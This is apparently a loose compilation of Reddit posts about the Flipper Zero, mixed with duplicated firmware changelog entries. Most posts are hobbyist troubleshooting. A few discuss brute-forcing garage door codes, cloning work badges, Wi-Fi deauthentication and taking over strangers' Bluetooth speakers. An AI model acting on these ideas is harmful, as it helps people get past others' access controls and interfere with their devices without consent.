 [DIY Arduino Based Guitar Tuner Project (circuitdigest.com)](https://circuitdigest.com/microcontroller-projects/arduino-uno-guitar-tuner) 

Maybe the flipper zero will work "almost" out of the box with this code because have a "buzzer" built-in to generate a sound when you apply DC voltage. A Piezo transducer/speaker can work as a low-quality microphone, in reverse to generate a signal when it's flexed/vibrated. 

Why I said "almost", in the datasheet of flipper zero the buzzer works in a frequency between 100-2500 Hz, in the documentation of the project the notation E2 it's correct at 82.41Hz, so it's the only one out of the range. But all the other notations (E4, B3, G3, D3, A2) are in the range of the buzzer.

I still don't have a flipper zero, but I would like to try in the future.  
If in addition, if someone wants to try give feedback.

As today is June 28th, the [previously promised](https://blog.flipperzero.one/quick-start-guide-and-shipping-update/) shipping date of late June for Rest of World- backers appears unlikely to happen. As such, and knowing that youre already selling devices that appear comply with Norwegian law on the open market, I think a shipping update is not only warranted, but honestly far overdue.

Hey! While waiting for my flipper zero to arrive, I wondered about cases I could use it for. I saw it uses the same frequency as LoRa ([https://en.wikipedia.org/wiki/LoRa](https://en.wikipedia.org/wiki/LoRa)), at least in Europe.

What do you think about this idea? Would it be possible to use it as a LoRa node?   
Since I don't have f0 in my hands, I'm not able to verify this idea.

Ive just ordered a new silicone case for my flipper, my dog was trying to figure out the universal remote feature it looks like.

Anyways, ordering from flipper is really expensive in the US. I dont have the setup to produce one other than from wood. 

Im very curious if there are folks that have successfully purchased on and liked it? Any makers out there done something awesome that protects the WiFi chip maybe?

Things Ive figured out so far with my flipper:
- opening the garage door
- scanned but havent emulated successfully a few old keys

Thanks yall

Hi all,

Got my Flipper Zero not long ago and realize it can play music. Granted, only a single channel, kind of like the ZX Spectrum and some others back in the day. The songs I came across on the Flipper were kind of boring so I thought I'd apply the same techniques we did back then - basically ultra fast tempo/arpeggios to fake chords and a top-line sounding kind of like it's all playing at the same time.

I wrote a thing in Python that converts a single Renoise track to the .fmf format the Flipper can read: [https://github.com/juanirming/flipnoise](https://github.com/juanirming/flipnoise)

As I mention in the video, it could definitely be improved. I think automating the chord generation and superimposing the melody from a second channel would be cool features. It doesn't matter what instrument you use in Renoise; the Flipper only produces one sound. You can use multiple patterns as long as you stay on Track 0. I recommend a BPM of \~500 as in the demo song provided. The Flipper has no problem keeping up and it could probably go even faster. I might try it later to see if we can get into frequency modulation territory but I doubt it. :)

Anyway, have fun and if you have any questions, let me know.

I'm wondering if anyone else is having this issue.  A while ago, I was trying to charge my Flipper Zero using an external 5v USB adapter and it got up to 87% before it gave up and stopped charging further.  i didn't think much of it at the time, ended up using it for a bit and tried charging it again. Now it won't go past 45%.  No Red Charging Light, No Lightning Battery Indicator.

Tried powering it off, doesn't fix it.  Tried re-installing firmware, still nothing. Tried powering it from my Macbook USB C port, nope.  According to Power &gt;&gt; Battery Info, the unit is saying "Charged!" (as if to indicate a full charge) but I know its not because its only indicating 45%. 

Does anyone know whats going on?  I reached out to customer support and am currently waiting for a response.

which states "This equipment generates, uses and can radiate radio frequency energy and, if not installed and used in accordance with the instructions, may cause harmful interference to radio communications. However, there is no guarantee that interference will not occur in a particular installation."

A good amount of backers have manifested their disagreement against the prioritization plan taken by the flipper team. I wonder if someone from the flipper team could detail how the batches were organized, because I feel the team was transparent on most of the subjects except on this.

Exposing the details behind the decisioning would def help people understand the reasoning and decrease frustration.

Seeing preorders in the US skipping the line over all the other regions (and even US backers) was bad, but apparently the same thing is happening in Europe.

    * Change from one big command to three small commands
      These changes follow from the review. Instead of having to
      rely in GOTOs (which are forbidden :&lt;( ) to ensure cleaning,
      I divided in smaller pieces. Since I had no feedback w.r.t
      the previously existing `gpio_set`, this fits more with the
      current implementation.

      I also tried to interpret "That's not how we do enums" as
      to not include a `enum EnumName` decl. when using typedefs.

      I also distanced the implementation from using LL_GPIO
      in favour of functions provided in `&lt;furi_hal_gpio.h&gt;`
      but there was nothing to get the mode, so I stuck with
      LL_GPIO for mode check.
- nfc: add debug PCAP output, refactor Mifare DESFire following #1095 (#1294)
    * nfc: refactor nfc_worker_read_mifare_desfire to use furi_hal_nfc_tx_rx
      Renames furi_hal_nfc_exchange_full to furi_hal_nfc_tx_rx_full, and
      rewrites it to use furi_hal_nfc_tx_rx.  This eliminates the final
      remaining use of furi_hal_nfc_exchange, so remove that.
    * nfc: write debug.pcap when debug mode enabled
      Limited to NFC protocols that use furi_hal_nfc_tx_rx to communicate.
    * switch to Doxygen style comment
- SubGhz: fix resetting the set frequency when retuning (#1300)
- Hardware LED blinking (#1303)
    * Hardware LED blinking notification messages

- More GPIO control through CLI (#1271)
    * Add more options
    * Change from one big command to three small commands
      These changes follow from the review. Instead of having to
      rely in GOTOs (which are forbidden :&lt;( ) to ensure cleaning,
      I divided in smaller pieces. Since I had no feedback w.r.t
      the previously existing `gpio_set`, this fits more with the
      current implementation.

      I also tried to interpret "That's not how we do enums" as
      to not include a `enum EnumName` decl. when using typedefs.

      I also distanced the implementation from using LL_GPIO
      in favour of functions provided in `&lt;furi_hal_gpio.h&gt;`
      but there was nothing to get the mode, so I stuck with
      LL_GPIO for mode check.
- nfc: add debug PCAP output, refactor Mifare DESFire following #1095 (#1294)
    * nfc: refactor nfc_worker_read_mifare_desfire to use furi_hal_nfc_tx_rx
      Renames furi_hal_nfc_exchange_full to furi_hal_nfc_tx_rx_full, and
      rewrites it to use furi_hal_nfc_tx_rx.  This eliminates the final
      remaining use of furi_hal_nfc_exchange, so remove that.

I ordered my Flipper cant wait to play around with it. I was wondering if anyone has written or found any good scripts or other downloads to really take advantage of its abilities? Link them below if you dont mind. 
Also, has a access control penetration device, has anyone used it in any real world penetration tests? Id be absolutely titillated to read about that.

In Australia this protocol uses 433MHz but the flipper only emulates it for 310/315/390. Is there a way to add another frequency range?

Hello, I just receive my flipper recently and it seems that my Learn Ir remote function seems to have stopped working. I tried linking it to the CLI too and nothing showed up there as well.

Any ideas for further trouble shooting steps? Hopefully its not a defect?

Thanks

Well, sendle officially denies responsibility for "delivered" flippers. There were 2 in the package.

They also refuse to honour insurance (max $300 anyway) because it was delivered as far as they are concerned, but they offer no actual proof of delivery.

They say they interviewed driver and searched around for it,. It this is bullshit. The admin desk where it would have been delivered to said they never came, and as far as we can tell there is no delivery on the CCTV on the premises at the reported delivery day, for hours either side of the delivery time.

I'm really pissed off at Flipper for using sendle; they are a broker who offer massively cheap delivery because they use one of two couriers who are renowned for absolutely bastardizing deliveries. Those two couriers often flog deliveries off to sole trader type delivery vans too.

Australia Post is really the best and most reliable option for such a valuable delivery. I'm extremely saddened and frustrated at sendle and it's cohorts for being so shit, and at sendle for choosing such a horrible company with a transparently shit reputation.

Feels pretty shitty waiting 2 years and then customs delay, to lose all our money and no recourse.

I placed an order on May 15th for "in stock" accessories, and after hearing nothing for over two weeks, I asked for an update. I was told that it would be shipping "within the coming weeks". This isn't for the Flipper itself - I already have that. This was for accessories that presumably were ready to ship. How long can it possibly take to put said items in a box and send them out the door?

I understand that maybe they're still fulfilling Kickstarter orders, but if they can't operate a web store yet, they shouldn't open it.

Good morning everyone. A few days ago I purchased a flipper and am waiting on arrival. I just really want to get a good idea from the community about what this device is actually capable of. I've read and seen demos about the stock features but being open it seems like there is much more. This is right up my alley in terms of cool/interesting/learning new tech. What can I realistically expect to be able to do from a beginners stand point with this. And how can I take this further and begin to fully utilize this device and start to learn how to mod/write/script custom plugins. I've seen a few interesting GitHub files that look like a good technical challenge. And some things are aren't really meant to be talked about on the public forums here too.

I guess I am just trying to get a good understanding and some guidance on my journey to learn to use this device to it's potential. And advice or links would be much appreciated. I am decently proficient in tech but security/coding/modding is new to me and this seems like a fun device to start learning with.

Thanks for any feedback

Hey guys, I haven't received my flipper yet but I have all ready ended up diving down a rabbit hole after seeing a post earlier today for UHT from [u/anzianojackson](https://www.reddit.com/user/anzianojackson/).

I have taken a look into a few different modules and Interfaces for UHF RFID, the one below is a USB-C plugin adapter.

[https://www.alibaba.com/product-detail/Fareastsun-Portable-860-960-MHZ-Type\_1600483217756.html?spm=a2700.galleryofferlist.normal\_offer.d\_title.744552b3MDSzgX&amp;s=p](https://www.alibaba.com/product-detail/Fareastsun-Portable-860-960-MHZ-Type_1600483217756.html?spm=a2700.galleryofferlist.normal_offer.d_title.744552b3MDSzgX&amp;s=p)

Does anyone know If I could get this to work as a plugin usb-c module for the flipper

The other alternative plan is I go the direct route with the actual module itself below and go direct from UART on the module and make a custom port to slot on the top from the dev board slot on the top. [https://www.alibaba.com/product-detail/Fareastsun-0-15-meters-4-ports\_62524468895.html?spm=a2700.wholesale.0.0.57e9569eBM3trG](https://www.alibaba.com/product-detail/Fareastsun-0-15-meters-4-ports_62524468895.html?spm=a2700.wholesale.0.0.57e9569eBM3trG)

Also would anyone be interested in helping create either a custom firmware or pointing me in the right direction to help create an add on for the flipper? I feel this project is possible and should be open source so its available for all (duh.)

End goal is to add a UHF selection on the menu screen when the plugin is enabled and anyone can either purchase the USBC Module and plug it in and off you go or alternatively going through a process of purchasing the modules creating a custom board and add on pack for the actual flipper from the actual standalone module itself, as well as putting all the documentation in a public area so anyone can replicate it.

Any Suggestions or directions to take this are much appreciated so we can all feed our flippers those extra frequencies.   


(I have purchased a standard USB UHF Read/writer from aliexpress so shipping will be a while, once it arrives I am going to use a USB to USBC OTG Adapter to see what I can get out of my flipper when that too arrives. My shipping hasn't locked yet , so Im guessing Im still waiting as Im in the UK, but I am keen to start working on this when both arrive!)

Just checking if there's any plans or progress on this or if it's even possible. I know most features "aren't a priority" right now, but it'd be awesome to actually be able to use this to log into Windows when I'm forced to use it, or at least have some idea of what I'm doing wrong. Keeps saying it's not compatible with this physical key.....??

This might be a dumb question cuz I'm new to the nfc space. I read a Mifare Classic card with my flipper zero and there's an option to "Run compatible app". Any idea what this does as it is just stuck at 0 for all options. A quick Google search didn't get me anything

Went to update via the browser (aka live swap between firmware versions), and when I pressed right to update, but before it reset to do the update, I fatfingered the ok button. I think that meant I was holding the ok button as it reset and entered the hardware emergency ST bootloader recovery mode instead of booting into the update mode, with the screen off (actually it was backlight off and lcd slowly fading). Freaked me out for a second, but a standard reboot (back and left) kicked it into update mode.

Just a heads up for anyone else who goes to update and are left staring a dying screen after starting the update: just reset and breath.

Although the most recent firmware (0.59.1) supports the ability to manually add a Sec + 2.0 profile under SubGhz, and it is able to pair with one's garage door, it cannot properly execute the commands to open and close. Do note that it can properly copy an already paired remote as the protocol is now readable by reading and then emulating.

If you have a garage door that utilizes Sec + 2, please submit recordings to [https://forum.flipperzero.one/t/lift-master-security-2/3503/7](https://forum.flipperzero.one/t/lift-master-security-2/3503/7) so that the devs can hastily get this issue resolved!

- Fix MiFare DESFire GetKeySettings response parsing (#1267)
    Only the bottom nybble of buf[1] is the key ID; the top nybble contains flags.
    Notably, the top bit is set for AES mode on EV1+ cards, and ORCA cards in the
    Seattle area were just upgraded to include an app that uses AES.
    Prior to this, cards with flags set could be read and saved just fine, but
    loading them would fail due to missing keys.  After this, tags saved with the
    old version will load fine, and when re-saved will have the flags separated
    out into a new field.

Im confused when it comes to the /u/MuddledBox firmware:

https://github.com/MuddledBox/flipperzero-firmware

I dont see all of the TX available in this the list when I flash the latest 0.55.1 release from GitHub. What am I missing here?

For example I dont see the following when traversing through the frequencies on the device when accessing Read or Read Raw config:

310.00 313.85 348.00 387.00 464.00 779.00 928.00

Also I noticed this repository:

https://github.com/MuddledBox/FlipperZeroSub-GHz

Where exactly am I meant to copy these sub files? Is it just the root section of the subghz folder on the SD Card? What do they actually do?

Hey guys! Finally flipper arrived today! Apart from being a little sad that the tamagotchi part is not there yet, its as cool as I hoped! 

I have some questions about setting up my aircon remotes. From what I remember about aircon remotes is the controller sends the entire state to the ac each time you change something and then the aircon sends the state back which updates the controller? Is that still the case? Is that all aircons? Is there a way to break the commands down into human readable format? 

Ideally I would like to set up some templates like set temp 24c, set timer to turn off at 6:30am, set mode to cool. 

So I could have a bunch of features I use regularly to instantly change the aircon. But I kinda get no feeedback from the ac and have no idea if I set the right temp or if the settings are active. 

Any advice? Any insight? Thanks guys!

I have some H10301 RFID's and they all have the same hex: 5F13E1

I can successfully read and write the same hex to different H10301 RFID's but once I edit an existing hex and change it to say: 0F13E1.

I am no longer able to write the new hex to any of the H10301 RFID's.

Any reason why? Should this be possible or is there something wrong with my F0?

New out of box, straight to updater. My update has been ongoing for days. Log files show it's still updating, device not idle, no errors. Why DaFuq is this taking so long to update?

Hi All! I got my flipper and played with it out of the box last night (pre-update). I was able to read all my cards and emulate etc. 


I did the firmware update this morning and now none of the cards are able to be read (flipper just never seems to detect them). Has anyone else had this issue? 


Thanks!

So Im scanning what the Flipper recognizes as a Mifare classic and it stops halfway thru. 

Does not identify card as any other kind of NFC.

When I scan and save it, the info says its NFC-A? With a two digit SAK and four digit ATQA also an 8 digitUID

It finds no data on the page across.

Happens to not work opening doors, as the actual swipe card does.

Yeah whats the story here?

Just wanted to share in case anyone was like me and wondering how to control their LG TV if you normally use the LG Magic Remote which doesn't emit IR signals (I think I read it uses bluetooth) - I happened to stay at a rental that had an LG TV with an IR remote and I copied most of the useful buttons and sure enough it works on my LG TV!

I received my kickstarter black device this past week. It seems like it turns on and the screen backlight turns on, but the display is blank. I already tried upgrading the firmware and reinstalling the firmware with no change. If I do the back and left button it appears to reboot according to the LED but ends up with the same backlight only screen again. I tried emailing support a week ago with no response, and tried the discord without success. Anyone have any other ideas?

[This article](https://blog.flipperzero.one/rfid/) mentions how some cards have 2 our of 3 bytes written on them. It also mentions, that its possible to brute force the unknown byte. So, when reading a LFRFID card, does flipper try to brute force it? Or is it something we have to manually implement. If so, did someone achieve it? 

I have a HID card and don't know the first byte, so this would be helpful.

Alternatively, is there any way to connect to an external display?

Also keep in mind this is brand new so it's still on the old firmware and I've never used it so I'm not at all familiar with the interface. Any help with starting points, if anything is possible at least.

I just tried to upgrade to the newest roguemaster firmware from the previous model.

Ended up frying my firmware completely, and having to restore to factory. This then erased my level progress.  

How do I do this properly?  Will each firmware upgrade really wipe level progress? How do you incrementally change firmware?

The rogue firmware comes with names built in- cheech, chong, noob. What if I like my flipper's name? can I just text editor change it back to my OG name (tried and that FW won't load)?

thanks

Hi there!  


I am trying to reverse engineer the protocol used by PixMob, which is a company that makes RGB LED bracelets (and some other things) given to crowd members at concerts or other events that flash in sync to music or other things going on. They are controlled by IR transmitters placed around the event venue (the line-of-sight nature of IR lets the event organizers have different sections of the arena light up in different ways).  


Coldplay is going to be doing concerts in Chicago (Saturday, May 28 and Sunday, May 29) and Landover (Wednesday, June 1) that will feature the PixMob bracelets. I'm hoping to find someone who can take their Flipper to one and record the IR signals/codes transmitted during the show. I'd be willing to buy a ticket for someone to go record the signals and send them to me (along with their bracelet from the show).

Comment or DM me if you want to help! Thanks :)

Hey gang, Id like to make an audio visualizer using I2C.  I think the simplest way to do this would be to have a serial data plotter on the Flipper.  Anyone have the programming know-how to implement this?
-------------------------------
1 : 2022-05-25
I see in the docs:  


At the moment, Flipper can **read**, save, **emulate** and **write**  these types of tags: 

* EM-Marin  EM4100, EM4102.
* HID  H10301. 
* Motorolla  Indala.  


I also read online that pet microchips can come in a few different frequences (134.2 kHz, 128 kHz, and 125 kHz)  


Does anyone know how I could figure out what format &amp; frequency the RFID in my pets' microchips are? I'm assuming those are the only two things that would prevent this from working.

So based on some quick searching around, it sounds like currently plugins must be built into the firmware at build time? I guess you could call that a build-time plugin, but this is a bit of a disappointment until the firmware gets the ability to load plugins from the SD card. (I imagine this is coming surely though)

If anyone knows any useful resources, let me know, but I did find this at least:  
[https://github.com/DroomOne/Flipper-Plugin-Tutorial](https://github.com/DroomOne/Flipper-Plugin-Tutorial)  
(Haven't tried it yet, but always good to start with Hello World!)  


Are plugins able to do everything the built-in firmware can do? (ie Sub-Ghz, RFID, NFC, IR, GPIO, iButton, Bad USB, U2F)  


Honestly what I'd really like to see is if all the existing "Apps" could be made into plugins, so that the core firmware piece could be more stable. Would probably want some more hierarchical way to organize plugins - could still keep the official apps separate. It'd be really slick if the core firmware could expose the SD card via USB (either mass storage or media transfer), allowing the user to mess with the files (add/modify codes/plugins/whatever), then unmount and you've updated your stuff. Firmware shouldn't need to be updated very often.  


Just my thoughts, but the qFlipper app is pretty cool!  


Also feel free to post a comment if you've found some other cool plugins!

I had to cheat a little... used a raspberry pi, yardstick one and python code to brute force liftmaster 9 dip switch garage doors. Tested and works perfectly. Used flipper to capture the output. Surprising it does not need a lot of space to record 1.5 hours of output. Takes 1.5 hours to run as my garage needs to hear the code 3 times, and has padding on the end of the code. Looking to create a larger database to include other brands or even same brand with different dip switch length. If anyone wants to contribute a capture from your garage code (prefer if you change the code so when you test it we will have confirmation that it works) and information on the transmitter I can share the brute forces I create

Say for example I want to create a contact card nfc file.

I mean... yes, it's entirely reverse engineer-able, but I'm just looking if someone knows of one that already exists.

I've tried various things to see if it vibrates, including:

* Turning vibration off and back on in the settings
* Runninng an alert from the app
* Pushing invalid buttons in menus/apps

Does anyone else's vibrate and if so, when?

I don't know if this is unrelated or just my imagination - could be both - but for some reason the RFID reader seemed to work better right out of the box when I first got the Flipper and was messing around with it. Before I updated the firmware and even installed an SD card, it picked up both my work IDs immediately. After I updated to the most current firmware, it picks up one of them (and I was able to emulate it successfully to open a door), and the other one isn't reading at all any more. I had that first one saved from before so I tried to emulate it but it wasn't successful at getting the door opened. Is it that this particular work ID is just too fancy or something else?

Hello /r/flipperzero! I just got my buddy today, and wanted to learn more about it since I was interested in getting one a year ago because of learning to program and mess with NFCs and card reading.

I just updated firmware and really just trying to think of projects that would help me learn more about this device. I'm honestly really new to all this, so is there any simple things I can do with F-0 to learn more tech knowledge? 

Thank you for your reading and I hope I can make something rad here one day

I should start with: Im super new to all this. I put the Amiibo folder in my NFC colder and can see them but when I try to emulate it my switch will not recognize it. Im on .58.1-Unleashed and used the files from here: https://github.com/Gioman101/FlipperAmiibo

Thanks ahead of time!!

What's everyone's favorite flavor so far? I loaded stock, then messed with Muddlebox and now I compiled and have the unleashed firmware. Anyone notice any pros/cons yet. I went with Unleashed as it appears more up to date in the community, amongst other reasons.

Super excited to get into RF and signals.  This has always been a gap in  my Red Team knowledge, time to learn.

I spent hours looking to change the device name? 

How can I change the name?

I saved four attempts to copy my fan remote (three with Read, one with Read RAW) but I'm getting the error that "This frequency can only be used for RX in your region." I see from another post that it's not allowed to transmit on this frequency for compliance/regulatory reasons, which is fine (mostly), but I can't delete the saved ones because my only option is to go Back from that error screen. It won't let me overwrite my attempts by using the same name, either. Any suggestions?
-------------------------------

I'm honestly not understanding what I am doing wrong. and to preface this I am sorry for my lack of knowledge on the subject, I have never used python before and have never coded. I'm really just a tech enthusiast. so this is so to say a learning experience for me.  anyways I should probably start where the problem first arose.

I received my WIFI dev board this morning. I had it shipped to work, so I could have hopefully an array of things to play with. I opened everything up and pulled up the [**Documentation**](https://docs.flipperzero.one/gpio-and-modules/wifi-debugger-module). everything worked really well and smoothly other than various user errors.

once I had figured out how to login to its WIFI network, I clearly cant read for some reason cause it took me a few minutes. oof. but I misconfigured the WIFI network and now I cant figure out how to connect to it via usb to redo the configuration. right now it is running in **STA** mode and ideally I'd like to just switch it to **AP** mode.

there are two things I have tried already. the first being attempting to use putty to communicate with it. typically that results in a black window that does nothing. so the second thing I figured I would try is flashing the firmware to it. assuming it probably needed to be updated anyways.

so I downloaded **python 3.10.4** and have been on an on going saga of frustration because I have no idea what I'm doing nor how to find the necessary documentation to figure it out. well sorta. I've been gradually piecing things together but more so bashing my head into the wall.

after a great deal of time I manage to get pip installed and thus was able to make my way to **step 4**. however I was unintelligent and took forever to realize I needed to exit python in my cli.  anyways I managed to get **ESPTOOL** installed. so I pretty much thought I was good to go from there.

so the real problem as I follow guides and I am copy pasting commands I constantly get **syntax errors**. I was having this issue when I was trying to get pip working and had to use a script command just to get it installed. which can be found [**Here**](https://packaging.python.org/en/latest/tutorials/installing-packages/#install-pip-setuptools-and-wheel)**.** anyways I'm at **step 7** of the firmware update and I cant seem to get it working. the **image below** shows the **flash.command** execution. 

[flash.command](https://preview.redd.it/7lrnany0l4091.png?width=1476&amp;format=png&amp;auto=webp&amp;s=4af42638a548c03381b5a17ac39720d976d2f561)

I've altered the script to the example in the documentation for windows. I also changed the com port after initial failure of just running the script to com6. **COM6** was what my device manager was displaying after I held the boot and clicked the reset buttons. at this point I'm just thoroughly stumped and don't know what to do. any assistance in trying to resolve this would really be appreciated. because honestly I if I haven't said it enough I'm exceedingly novice when it comes to this.

Thank you everyone for your time!

Hello everyone!

OK, so, I am the noobiest of noobs here. But I am willing to learn. I just don't know where and with what to start.

What's the funnest/coolest/most useful things you do with your flipper? (if you use custom firmware for that, please let us know) 

Honestly, so far I have only been playing with the TV and AC lol and while it can be useful in some scenarios, I want to dive into the other things, but I don't really know where to start, so please let me know what's your favorite things to do with the Flipper! (a few tricks to make your mates jaws drop would be much appreciated as well lol).

Thanks all for taking the time to read and answer this! (I wish there was an idiots guide YouTube series for this).

Hey all,

I am trying to get my gate opener into my flipper but its not picking up any signal at all (not even from freq analyzer). I tried changing from AM to FM and still nothing. The FCC document says its at 310MHz so I'm not sure what the issue is. Any help would be appreciated!

Hi everyone,

I've been having trouble getting my SD card to format and be recognized by my flipper. I've got a Samsung Evo plus 256gb card and when I insert it, it will show me how much space is available in the settings but when I go to do certain functions, it will tell me that there isn't an SD card installed. I tried to format it in the device but it just sat on the 'formatting...' screen for about 20-30 minutes before I rebooted it. I formatted it on my computer as well but had the same issue. Any help would be appreciated!
-------------------------------

I have not used my device for some days and when I checked it out, it was out of charge (screen was dead). When I plugged it in to charge using my phone charger, the screen turned on and the LED indicator was working. However, after a minute or so, I had to go out so I switched it to my power bank (5V 3A output).

The device died again soon after and now it won't charge. The screen is just black and the LED indicator is not working. 

I know it's not charging because my power bank is not displaying a lighting symbol (it shows when I use it to charge my phone or other devices) and the displayed charge did not decrease after 30 min.

Anyone else had this issue?

`Duration: 4`

`Octave: 5`

`Notes: B4, E., 8G, F#, 2E, B, 2A., 2F#., E., 8G, F#, 2D#, F, 2B4., 2B4, B4, E., 8G, F#, 2E, B, 2D6, C#6, 2C6, G#, C6., 8B, A#, 2A#4, G, 2E5., 2E5, G, 2B, G, 2B, G, 2C6, B, 2A#, F#, G., 8B, A#, 2A#4, B4, 2B., 2B, G, 2B, G, 2B, G, 2D6, C#6, 2C6, G#, C6., 8B, A#, 2A#4, G, 2E., 2E`

A thought for updating the device;

I have an iPad Pro (2nd Gen) and a USB-C to USB-A female connector. For those of us who may not have daily access to our PCs, could we potentially build in an additional update option to update the FW of the device through the app via an appropriate cable if the Bluetooth option is unavailable for whatever reason?

Just got my flipper today finally! I have been trying to test some basic stuff.    


Work Keycard - doesn't detect, it. After reading up more, I am assuming it is because the keycard is of a newer unsupported format. Hopefully which will be added later.  


In the meantime I tried my gf's apartment gate.  Which uses: [https://headlightsticker.com/](https://headlightsticker.com/faqs/) This was also undetected.  I figure Flipper cannot possible support every proprietary format out there.   


Is there anyway to just read raw RFID data to save/playback?    


Sorry if this has been asked or if its on the docs, feel free to just point me at a link.   


Thanks and happy hacking.

After seeing /Beneficial_Ease8865 posting about copying their fan remote, I thought I'd try mine - the frequency analyzer shows the remote transmitting at around 304MHz, but that frequency does not seem to be an option for me when I go to "Read" -  what should I be looking for?

Got my new flipper friend in the other day updated with latest stable firmware. When connecting them to various power sources with various different cables battery info app says charged, but the percentage sticks around 45% and doesn't show the charging icon on desktop. The led doesn't illuminate red/green as described in the manual either. Am I missing something or is my new friend on borrowed time?

Hey, got my flipper and have already updated it to the latest firmware (v0.58.1 as of writing this). I've done a reinstall of the firmware and charged it up; the battery status says it's fully charged when I check it. However when I unplug it, it immediately dies and the back button hold for 3 seconds or the restart back+left thing doesn't work either. At some point I was able to get it booted while trying to hold the center and back button to do a full reset and the battery status still registered as full then but as soon as I plugged it into my PC and then unplugged it again it shut off.  


I'm sure this has come up before so just checking to see if anyone has resolved this. May take the thing apart and hit the battery connections with a multi-meter and see what's up. The button itself seems to work when it has power through usb so I don't think that's the issue.

Sorry if this has been asked before....  


I just got my Flipper Zero today, and while I figured out how to mess around with TV remotes ("teaching" it the buttons) I don't know how to pull databases from github. To be honest, I didn't really know about github until I started digging around in the sub, but I still have no idea what I'm doing on the site. Can anyone point me in the right direction? Thank you in advance!

After looking at eBay prices there is no way I'm paying $500-700 for a flipper zero. How fast do these sell out on  the website? Is there any app I could use to notify me via SMS when I get the email when there is a new batch in stock, in order to ensure I grab one as soon as possible?

Is there a central database for people's projects and assets for those projects?

Like a central location for a bunch of NFC files/bins

I have a handful of IRs on my Flipper now, I was wondering how I would go about adding folders within the flipper itself to help clean things up.

As an example, right now all of my saved remotes follow the path **Infared-&gt;Saved Remotes** and are all sprawled out in the order I saved them in. I would just like to be able to view another folder while using Flipper so I can keep track more easily.

Any help is greatly appreciated :)

Received my FlipperZero last week and do not have any use for it now. Simply took too long from the Kickstarter to arrival date and do not have the time to dedicate to it. Send me a DM with a fair price (I'm not looking to make a profit just breaking even will be fine with me). Easier if your in the NCR area. The only thing I did was update the firmware.

I own a pwnagotchi and have found there is a lot to be desired from the device such as being able to have it not just randomly deauth whenever its on but instead when I want it to. The Flipper is very convenient in that you tell it when to scan Vs it doing it on its own whenever it wants all the time. My question is if there is a way to do deauth using the flipper zero using the Wi-Fi board they sell?
-------------------------------

Anyone here who knows if the flip can be connected to a Kali running device and act as a BT/Wifi Monitor device? Would be nice to be able to connect it with Blue Hydra or BT scanner to scan for / gain access to some random speakers. 

Forgot your headphones and your at the gym? Fear not. You might go dancing and the DJ kills your vibe, dont worry about it, some teenagers playing something aint worth listening 2? Hit them with some over the top Clapton. 

The possibilities are endless

I updated Flipper using qFLipper and the update failed with the same error I get when trying to repair it. My screen will not come on now but I can boot to full recovery mode and run a repair. Here is what I have done to try to diagnose the issue.

* I tried 3 different USB cables.
* I tried 2 different USB ports.
* I tried 2 different computers.
* I tried all the boot options, but nothing ever shows on the screen and the blue light never comes on.
* I updated the DFU drivers.
* I uninstalled qFlipper and reinstalled it several times.

Sub-GHz:

Observed garage remote transmissions. Experimented with playback, no success, but also has not blocked current remote. I can reset it any time so I'm not worried. Will experiment more. I have the TESLA files so I'll be looking for an opportunity to try it. I don't know anyone with a tesla right now.

Will try my 433-MHz transceiver. Should be trivial to copy.

125KHz RFID: I don't think I have any of these

NFC: Able to read my work pass, and it says it can emulate it. But I don't know if just emulating the UID would be enough to stand in as the actual pass, or if there is more data that is exchanged. I will not be experimenting with anything work related other than passively reading my work card. 

I am looking for a system where I would be allowed to experiment. I might have to buy the infrastructure myself.

Infrared: I downloaded another database of televisions that I found in this subreddit. Supposedly allows a larger database of TV's. I have also added my television by recording it, and an air purifier that I use.

GPIO: I have plans to make an accessory board with a relay so that I can switch a load on and off with GPIO.

Ibutton: I don't even know what this is and have never seen one in the wild.

U2F: I use 2-factor authentication in many things but it's either a prompt or a generated key. Not sure how this works.

Plugins: I hope to write some plugins. 

Other stuff:

Serial connection over USB: You can plug it in and then connect to it with a serial client like PuTTy. Then you can send it commands to do things. I would like to see this possible with the bluetooth android app too.

Bluetooth connection is great. There is an android app. You can control the entire thing from your phone. It will stream the screen to your android device. For example you can have the flipper zero in your pocket and use the android app to tell it to broadcast a Sub-GHz code such as the tesla charging door code. Or whatever. The fact that you can use the device while it's in your pocket or even perhaps on a shelf nearby is amazing.

Summary: It's a lot of fun but I feel that I have barely scratched the surface. We need better documentation so we can participate in development. The app is a great way to interface and overlooked somewhat.

So I've been having trouble with saving key fobs, and i believe that the ones i have aren't supported or whatever. Because it doesn't seem like i can input them manually either. Which is upsetting cause it's what i was most hopeful for, but i was wondering
Do you think this is the kind of issue that may be able to be adjusted through software updates or something i could adjust? Or will the flipper just not be capable of it?
I'm pretty new to all this stuff, so if this is a stupid question, Kindness would still be greatly appreciated, 
Thanks
Hope y'all are having a great day

I am having trouble with charging

When plugged in the led is off and the battery status screen from settings says charged! But the level is at 75%

Does the battery level have to be below a certain % to allow charging?

Thanks

I got just got mine not that long ago and one of the first things I noticed was there is a tiny hair trapped between the display and the plastic screen, and I'd like to get it out of there. But if this ends up being like a Curta calculator in terms of difficulty to reassemble I'd rather not.

Anyone buy any accessories they might recommend like a lanyard or a 3rd party accessory thats not that well known?
-------------------------------
1 : 2022-05-06
Has anyone considered or worked on a 'monitor mode' for the Sub-GHz read where it would only kick off recording when a signal over a certain level was detected? I doubt I have to explain the usage cases but would be nice to be in analyzer mode but automatically trigger recording to capture the signal profile when it is active. 'set it and forget it' mode or whatever you'd like to call it.

It shows that it definitely is reading my garage door clicker, but when trying to resend/emulate signal captured from garage door clicker it does not work.

Any ideas?

Title says it all. I'd really prefer using my win10 (32bit) box for managing my Flipper but am unable to find a 32bit version of qflipper. Does it simply not exist and if so are there any plans to implement?

Thank you.

Hey, a happy baker noob here. Received my Flipper recently. Unfortunately, not all remotes I have works with it. I'm looking for help with the DKS ([DKS DoorKing 8066-082 MicroCLIK](https://fccid.io/LSD66T)) [garage opener](https://www.northshorecommercialdoor.com/do80mi1buawp.html). What I learned, it uses 318 MHz frequency with dynamic code. I'm a practical noob in engineering, so I need someone who can point me into custom fw on github (if it even exists). I know it's early, but, maybe, someone already tackled it?

I'm planning on making a career transition into Cybersec with 0 experience. Currently halfway through my Security + studies so bare with me.

I started following some Cybersec groups on reddit and YouTube and the flipper started popping up. Just what is this thing?

Should I buy it to tinker with it? What can I do with it? What should I do with it? Will this help me in my new career?

I'm also a huge tech geek so seeing what you guys can do with it like making it into tetris and such is cool but I feel like I'm not understanding the full utility of the flipper judging by how some of you describe it in posts.
-------------------------------
1 : 2022-05-02
Hello all, pardon me in advance for my lack of knowledge as I am about as much of a noob as it gets when it comes to pentesting and cybersec.

